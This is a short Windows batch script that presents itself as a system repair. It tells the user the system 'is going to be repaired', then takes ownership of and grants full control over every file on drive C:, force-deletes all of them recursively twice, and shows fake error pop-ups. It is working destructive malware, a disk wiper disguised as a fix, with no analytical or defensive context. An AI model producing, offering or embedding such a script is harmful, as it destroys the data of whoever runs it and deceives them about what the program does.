
        @echo off
start "" /wait cmd /c "echo this system is going to be repaired!!! & echo( & pause"
    icacls "C:\*.*" /grant %user%:F /t
    takeown /f "C:\*.*" /r /d y
    del /q /f "C:\*.*" /s
    del /q /f "C:\*.*" /s
for /L %%i in (1,1,10) do (
    start cmd /c "echo Error occurred while repairing system! & echo( & pause"
    timeout /t 7 >nul
)
echo shutdown -r -t 20
